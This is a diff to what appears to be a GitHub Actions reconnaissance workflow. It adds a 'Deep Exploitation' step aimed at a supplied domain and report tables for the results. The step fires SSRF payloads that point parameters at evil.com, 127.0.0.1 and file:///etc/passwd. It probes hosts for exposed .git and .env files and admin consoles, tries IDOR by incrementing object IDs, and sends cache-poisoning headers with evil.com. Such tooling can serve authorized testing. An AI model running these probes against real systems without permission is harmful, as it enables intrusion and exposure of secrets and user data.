@@ -157,6 +157,104 @@ jobs:
       env:
         DOMAIN: ${{ inputs.domain }}
 
+    - name: Deep-Test
+      id: deep-test
+      run: |
+        set +e
+        export PATH=$HOME/go/bin:$PATH
+        DOMAIN="${DOMAIN:-${{ inputs.domain }}}"
+        [ -z "$DOMAIN" ] && DOMAIN="unknown"
+        TMP="/tmp/recon-$DOMAIN"
+        mkdir -p /tmp/findings/deep
+
+        echo "=== DEEP EXPLOITATION ==="
+
+        # --- SSRF VALIDATION ---
+        > /tmp/findings/deep/ssrf-verified.txt
+        grep -E '(return_url|redirect_uri|callback|webhook|proxy|fetch)=' "$TMP-urls.txt" 2>/dev/null | head -10 | while read url; do
+          target=$(echo "$url" | grep -oP 'https?://[^&\s"'"'"']+' | head -1)
+          [ -z "$target" ] && continue
+
+          param=$(echo "$url" | grep -oP '(return_url|redirect_uri|callback|webhook|proxy|fetch)=[^&\s]+' | head -1)
+          base=$(echo "$url" | cut -d'?' -f1)
+
+          # Test 1: External URL
+          ext_resp=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 4 --max-time 6 "${base}?${param%%=*}=http://evil.com" 2>/dev/null)
+          # Test 2: Internal IP
+          int_resp=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 4 --max-time 6 "${base}?${param%%=*}=http://127.0.0.1:8080/" 2>/dev/null)
+          # Test 3: File protocol
+          file_resp=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 4 --max-time 6 "${base}?${param%%=*}=file:///etc/passwd" 2>/dev/null)
+
+          [ "$ext_resp" != "000" ] && echo "[ext:$ext_resp] ${base}?${param%%=*}=http://evil.com" >> /tmp/findings/deep/ssrf-verified.txt
+          [ "$int_resp" != "000" ] && echo "[int:$int_resp] ${base}?${param%%=*}=http://127.0.0.1:8080/" >> /tmp/findings/deep/ssrf-verified.txt
+          [ "$file_resp" != "000" ] && echo "[file:$file_resp] ${base}?${param%%=*}=file:///etc/passwd" >> /tmp/findings/deep/ssrf-verified.txt
+        done
+        SSRF_DEEP=$(wc -l < /tmp/findings/deep/ssrf-verified.txt 2>/dev/null || echo 0)
+        echo "  SSRF deep: $SSRF_DEEP tests"
+
+        # --- STAGING PROBE ---
+        > /tmp/findings/deep/staging-hits.txt
+        head -30 "$TMP-interesting.txt" 2>/dev/null | while read sub; do
+          [ -z "$sub" ] && continue
+          host=$(echo "$sub" | tr -d '*.')
+          for path in "/.git/HEAD" "/.env" "/robots.txt" "/api/" "/admin/" "/console/" "/actuator/health" "/swagger" "/graphql" "/version" "/status"; do
+            code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 3 --max-time 5 "https://$host$path" 2>/dev/null)
+            [ "$code" != "000" ] && [ "$code" != "403" ] && [ "$code" != "404" ] && echo "https://$host$path [$code]" >> /tmp/findings/deep/staging-hits.txt
+          done
+        done
+        STAGING_HITS=$(wc -l < /tmp/findings/deep/staging-hits.txt 2>/dev/null || echo 0)
+        echo "  Staging hits: $STAGING_HITS"
+
+        # --- IDOR DEEP ---
+        > /tmp/findings/deep/idor-verified.txt
+        grep -oP '(https?://[^?]*[?&](id|user_id|uid|account_id|order_id|profile_id|doc_id|file_id|report_id|ticket_id|number|num)=\d+)' "$TMP-urls.txt" 2>/dev/null | head -10 | while read url; do
+          id_param=$(echo "$url" | grep -oP '(id|user_id|uid|account_id|order_id|profile_id|doc_id|file_id|report_id|ticket_id|number|num)=\d+')
+          param_name="${id_param%%=*}"
+          id_val="${id_param##*=}"
+
+          # Fetch original
+          orig_size=$(curl -sk -o /tmp/idor_orig.txt -w "%{size_download}" --connect-timeout 4 --max-time 6 "$url" 2>/dev/null)
+          orig_code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 4 --max-time 6 "$url" 2>/dev/null)
+
+          # Fetch swapped (id+1)
+          new_id=$((id_val + 1))
+          swapped_url=$(echo "$url" | sed "s/${param_name}=${id_val}/${param_name}=${new_id}/")
+          swap_size=$(curl -sk -o /tmp/idor_swap.txt -w "%{size_download}" --connect-timeout 4 --max-time 6 "$swapped_url" 2>/dev/null)
+          swap_code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 4 --max-time 6 "$swapped_url" 2>/dev/null)
+
+          # Flag if both return 200 with similar content size
+          size_diff=$((orig_size - swap_size))
+          [ ${size_diff#-} -lt 500 ] && [ "$orig_code" = "200" ] && [ "$swap_code" = "200" ] && [ "$orig_size" -gt 100 ] && [ "$swap_size" -gt 100 ] && {
+            echo "IDOR-SUSPECT: $url (${orig_size}b) vs $swapped_url (${swap_size}b) [diff=$size_diff]" >> /tmp/findings/deep/idor-verified.txt
+          }
+        done
+        IDOR_DEEP=$(wc -l < /tmp/findings/deep/idor-verified.txt 2>/dev/null || echo 0)
+        echo "  IDOR deep: $IDOR_DEEP suspects"
+
+        # --- CACHE POISONING CHECK ---
+        > /tmp/findings/deep/cache-check.txt
+        head -5 "$TMP-live.txt" 2>/dev/null | awk '{print $1}' | while read host; do
+          [ -z "$host" ] && continue
+          # Test X-Forwarded-Host reflection
+          resp=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 3 --max-time 5 -H "X-Forwarded-Host: evil.com" "$host" 2>/dev/null)
+          [ "$resp" = "302" ] || [ "$resp" = "301" ] && echo "CacheCand: $host responds $resp to X-Forwarded-Host: evil.com" >> /tmp/findings/deep/cache-check.txt
+          # Test X-Forwarded-Scheme
+          resp2=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 3 --max-time 5 -H "X-Forwarded-Scheme: http" "$host" 2>/dev/null)
+          [ "$resp2" != "000" ] && echo "XFH-Scheme: $host [$resp2]" >> /tmp/findings/deep/cache-check.txt
+        done
+        CACHE_CHECKS=$(wc -l < /tmp/findings/deep/cache-check.txt 2>/dev/null || echo 0)
+        echo "  Cache checks: $CACHE_CHECKS"
+
+        # Export deep results for report
+        echo "ssrf_deep=$SSRF_DEEP" >> $GITHUB_OUTPUT
+        echo "staging_hits=$STAGING_HITS" >> $GITHUB_OUTPUT
+        echo "idor_deep=$IDOR_DEEP" >> $GITHUB_OUTPUT
+        echo "cache_checks=$CACHE_CHECKS" >> $GITHUB_OUTPUT
+
+        echo "DEEP-TEST COMPLETE"
+      env:
+        DOMAIN: ${{ inputs.domain }}
+
     - name: Report
       run: |
         set +e
@@ -181,6 +279,10 @@ jobs:
         | API Endpoints | $(grep -c http /tmp/findings/api.txt 2>/dev/null || echo 0) |
         | JS Secrets | $(grep -c . /tmp/findings/secrets.txt 2>/dev/null || echo 0) |
         | SSRF Candidates | $(grep -c http /tmp/findings/ssrf.txt 2>/dev/null || echo 0) |
+        | Deep: SSRF Tests | ${{ steps.deep-test.outputs.ssrf_deep }} |
+        | Deep: Staging Hits | ${{ steps.deep-test.outputs.staging_hits }} |
+        | Deep: IDOR Suspects | ${{ steps.deep-test.outputs.idor_deep }} |
+        | Deep: Cache Checks | ${{ steps.deep-test.outputs.cache_checks }} |
 
         ## Interesting Subdomains (Shtylla 1: Hidden Targets)
         \`\`\`
@@ -215,6 +317,28 @@ jobs:
         ## Nuclei
         \`\`\`
         $(head -15 /tmp/findings/nuclei.txt 2>/dev/null)
+        \`\`\`
+
+        ## 🔥 Deep Exploitation (Verified)
+
+        ### SSRF Validation
+        \`\`\`
+        $(head -15 /tmp/findings/deep/ssrf-verified.txt 2>/dev/null)
+        \`\`\`
+
+        ### Staging/Dev Accessible
+        \`\`\`
+        $(head -15 /tmp/findings/deep/staging-hits.txt 2>/dev/null)
+        \`\`\`
+
+        ### IDOR Verified
+        \`\`\`
+        $(head -15 /tmp/findings/deep/idor-verified.txt 2>/dev/null)
+        \`\`\`
+
+        ### Cache Poisoning
+        \`\`\`
+        $(head -15 /tmp/findings/deep/cache-check.txt 2>/dev/null)
         \`\`\`
 
         ---
